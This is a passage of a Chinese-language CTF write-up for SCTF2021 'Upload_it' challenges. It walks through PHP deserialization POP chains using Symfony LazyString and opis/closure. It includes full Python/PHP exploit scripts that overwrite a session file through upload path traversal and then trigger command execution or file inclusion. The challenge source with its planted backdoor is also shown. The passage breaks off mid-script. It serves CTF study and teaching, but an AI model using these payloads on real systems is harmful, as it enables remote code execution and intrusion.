<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">opis/closure,该库用于序列化闭包和匿名函数,例如:</span><br><span class="line"></span><br><span class="line">include_once &quot;../vendor/opis/closure/autoload.php&quot;;# 引用该依赖</span><br><span class="line">$func = function () &#123;</span><br><span class="line">        system(&quot;cat /flag&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">$raw = \Opis\Closure\serialize($func);#序列化闭包函数</span><br><span class="line">$unseri = unserialize($raw);#反序列化,此时该变量放入类成员属性中序列化</span><br></pre></td></tr></table></figure>

<p>构造exp如下,生成session文件:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">LazyString</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">value</span>;<span class="comment">//触发（）（）</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>  &#123;</span><br><span class="line">    <span class="title">include_once</span> &quot;../<span class="title">vendor</span>/<span class="title">opis</span>/<span class="title">closure</span>/<span class="title">autoload</span>.<span class="title">php</span>&quot;;<span class="comment"># 导入依赖</span></span><br><span class="line">    ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;On&quot;</span>);</span><br><span class="line">    error_reporting(E_ALL | E_STRICT);</span><br><span class="line">    <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">LazyString</span>;</span><br><span class="line">    <span class="variable">$raw</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$func</span>);</span><br><span class="line">    <span class="variable">$lazy</span> = <span class="keyword">new</span> LazyString(unserialize(<span class="variable">$raw</span>));</span><br><span class="line">    session_save_path(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    session_start();<span class="comment">#生成session文件</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="variable">$lazy</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到index.php文件代码,可以看到payload在反序列化后赋给了$_SESSION[“upload_path”]变量,随后被当作字符串拼接触发__toString(),即可造成命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload_file_path = $_SESSION[&quot;upload_path&quot;].&quot;/&quot;.$_POST[&#x27;path&#x27;];</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8001&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;rxxxx&#x27;</span>&#125;</span><br><span class="line">proxy_test = requests.get(url, proxies=proxy, cookies=cookie)</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace Symfony\Component\String&#123;</span></span><br><span class="line"><span class="string">    class LazyString&#123;</span></span><br><span class="line"><span class="string">        private $value;</span></span><br><span class="line"><span class="string">        public function __construct($value)&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;value = $value;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace  &#123;</span></span><br><span class="line"><span class="string">    include_once &quot;../vendor/opis/closure/autoload.php&quot;;</span></span><br><span class="line"><span class="string">    $func = function () &#123;system(\&quot;type D:flag.txt\&quot;);&#125;;</span></span><br><span class="line"><span class="string">    use Symfony\Component\String\LazyString;</span></span><br><span class="line"><span class="string">    $raw = new \Opis\Closure\SerializableClosure($func);</span></span><br><span class="line"><span class="string">    $lazy = new LazyString($raw);</span></span><br><span class="line"><span class="string">    //session_save_path(&quot;.&quot;);</span></span><br><span class="line"><span class="string">    //session_start();</span></span><br><span class="line"><span class="string">    //$_SESSION[&quot;upload_path&quot;] = $lazy;</span></span><br><span class="line"><span class="string">    print_r(serialize($lazy));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;upload_path|&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp.php&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br><span class="line">payload += os.popen(<span class="string">&#x27;php exp.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[debug] payload is: &#x27;</span> + payload)</span><br><span class="line">os.popen(<span class="string">&#x27;del exp.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;sess_rxxxx&#x27;</span>, payload)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;../../../sessions&#x27;</span>&#125;</span><br><span class="line">postfile = requests.post(url, files=file, data=data, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[debug] post evil file ..&#x27;</span>)</span><br><span class="line">getflag = requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;emptyfile&#x27;</span>, <span class="string">b&#x27;emptycontent&#x27;</span>)&#125;, cookies=cookie, proxies=proxy)</span><br><span class="line"><span class="built_in">print</span>(getflag.text[getflag.text.find(<span class="string">&#x27;flag&#123;&#x27;</span>):getflag.text.find(<span class="string">&#x27;&#125;&#x27;</span>,getflag.text.find(<span class="string">&#x27;flag&#123;&#x27;</span>))+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<h2 id="Upload-it2"><a href="#Upload-it2" class="headerlink" title="Upload_it2"></a>Upload_it2</h2><p>题目源码与上一个差不多</p>
<p>在index.php文件中声明了一个sandbox类,该类存在__call()方法可以任意调用本类中存在的方法,还存在一个后门方法backdoor()可以任意包含文件</p>
<p>禁止了__wakeup(),__destruct()方法,意味着我们不能直接反序列化这个类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//debug</span></span><br><span class="line">session_save_path(<span class="string">&#x27;./sessions/&#x27;</span>);</span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./tmp/sandbox&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;/tmp/sandbox&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    @mkdir(UPLOAD_PATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// emmm...easy backdoor</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sandbox</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$upload_path</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make_user_upload_dir</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$md5_dir</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . session_id());</span><br><span class="line">		<span class="keyword">$this</span>-&gt;upload_path = UPLOAD_PATH . <span class="string">&quot;/&quot;</span> . <span class="variable">$md5_dir</span>;</span><br><span class="line">		@mkdir(<span class="keyword">$this</span>-&gt;upload_path);</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>] = <span class="keyword">$this</span>-&gt;upload_path;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has_upload_dir</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		I removed this code because it was too dangerous.</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;NO NO NO&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		I removed this code because it was too dangerous.</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) &#123;</span><br><span class="line">			call_user_func_array(</span><br><span class="line">				[<span class="keyword">$this</span>, <span class="variable">$func</span>],</span><br><span class="line">				<span class="variable">$value</span></span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="comment">// __destruct and __wakeup are deleted. It looks like backdoor should not be called.</span></span><br><span class="line">		<span class="keyword">include_once</span> <span class="keyword">$this</span>-&gt;evil;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$box</span> = <span class="keyword">new</span> sandbox();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$box</span>-&gt;has_upload_dir()) &#123;</span><br><span class="line">    <span class="variable">$box</span>-&gt;make_user_upload_dir();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">            <span class="variable">$upload_file</span> = <span class="variable">$upload_file_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$upload_file_path</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>];</span><br><span class="line">            <span class="variable">$upload_file</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;upload_path&quot;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$upload_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;OK! Your file saved in: &quot;</span> . <span class="variable">$upload_file</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;emm...Upload failed:(&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;too big!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;CODE</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Upload&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Upload files casually XD&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">            FILE: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">            PATH: &lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;hr&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &lt;h3&gt;or...Just look at the phpinfo?&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;a href=&quot;./index.php?phpinfo=1&quot;&gt;go to phpinfo&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">CODE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>composer.json文件中,并没有导入<code>opis/closure</code>依赖,这意味着我们不能像上一题那样序列化闭包函数来利用<code>$this-&gt;value = ($this-&gt;value)();</code>该点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># composer.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;sctf2021/upload2&quot;,</span><br><span class="line">    &quot;authors&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;name&quot;: &quot;AFKL&quot;,</span><br><span class="line">            &quot;email&quot;: &quot;upload2@qq.com&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;require&quot;: &#123;</span><br><span class="line">        &quot;symfony/string&quot;: &quot;^5.3&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>该题其实比上题要更简单些,pop链很清晰:</p>
<p>字符串拼接触发__toString方法,调用<code>$this-&gt;value = ($this-&gt;value)();</code>点,这里我们令<code>$this-&gt;value</code>为数组<code>[&#39;sanbox&#39;, &#39;backdoor&#39;]</code>,这样<code>($this-&gt;value)()</code>会去调用sanbox类的静态方法backdoor,很明显该类没有这个静态方法(注意backdoor是成员方法),触发sanbox类的__call()方法,紧接着去调用backdoor方法,即可造成任意文件包含</p>
<p>这里做一个测试来验证对一个数组进行函数调用会发生什么</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;u win !&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$func</span>)) &#123;</span><br><span class="line">			call_user_func_array(</span><br><span class="line">				[<span class="keyword">$this</span>, <span class="variable">$func</span>],</span><br><span class="line">				<span class="variable">$value</span></span><br><span class="line">			);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$evil</span> = <span class="keyword">array</span>(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;backdoor&#x27;</span>);</span><br><span class="line">(<span class="variable">$evil</span>)();</span><br><span class="line"><span class="comment">//运行</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D:\Document\a复盘\sctf2021\Upload_it2\public&gt;php sanbox.php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Deprecated: Non-static method A::backdoor() should not be called statically in D:\Document\a复盘\sctf2021\Upload_it2\public\sanbox.php on line 18</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Call Stack:</span></span><br><span class="line"><span class="comment">    0.0002     395960   1. &#123;main&#125;() D:\Document\a复盘\sctf2021\Upload_it2\public\sanbox.php:0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">u win !</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>运行该测试文件弹出<code>Non-static method A::backdoor() should not be called statically</code>,意思是没有可用的静态方法<code>A::backdoor()</code>可供调用,此时会触发__call()方法,接着去调用该类的backdoor()方法,打印输出</p>
<p>理论上是这么讲的,但实际上没有该__call()方法也可以调用backdoor()方法</p>
<p>测试中直接<code>A::backdoor();</code>也可以调用成员方法</p>
<p><img src="2021122621/image-20211229125505518.png" alt="image-20211229125505518"></p>
<p>下面是exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import os,requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8001&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;rxxxx&#x27;</span>&#125;</span><br><span class="line">proxy_test = requests.get(url, proxies=proxy, cookies=cookie)</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;&#x27;</span><span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">namespace Symfony\Component\String&#123;</span></span><br><span class="line"><span class="string">    class LazyString&#123;</span></span><br><span class="line"><span class="string">        private $value;</span></span><br><span class="line"><span class="string">        public function __construct($value)&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;value = $value;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string">    class sandbox &#123;</span></span><br><span class="line"><span class="string">        private $evil;</span></span><br><span class="line"><span class="string">        public function __construct()&#123;</span></span><br><span class="line"><span class="string">            $this-&gt;evil = &quot;./flag&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    use Symfony\Component\String\LazyString;</span></span><br><span class="line"><span class="string">    $value = array(new sandbox(),&quot;backdoor&quot;);</span></span><br><span class="line"><span class="string">    $lazy = new LazyString($value);</span></span><br><span class="line"><span class="string">    print_r(serialize($lazy));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;upload_path|&#x27;</span></span><br><span class="line"></span><br><span class="line">with open(<span class="string">&#x27;exp.php&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(code)</span><br><span class="line">payload += os.popen(<span class="string">&#x27;php exp.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;[debug] payload is: &#x27;</span> + payload)</span><br><span class="line">os.popen(<span class="string">&#x27;del exp.php&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;sess_rxxxx&#x27;</span>, payload)&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;../../../sessions&#x27;</span>&#125;</span><br><span class="line">postfile = requests.post(url, files=file, data=data, proxies=proxy)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&#x27;[debug] post evil file ..&#x27;</span>)</span><br><span class="line">getflag = requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;emptyfile&#x27;</span>, <span class="string">b&#x27;emptycontent&#x27;</span>)&#125;, cookies=cookie, proxies=proxy)</span><br><span class="line"><span class="keyword">print</span>(getflag.text[getflag.text.find(<span 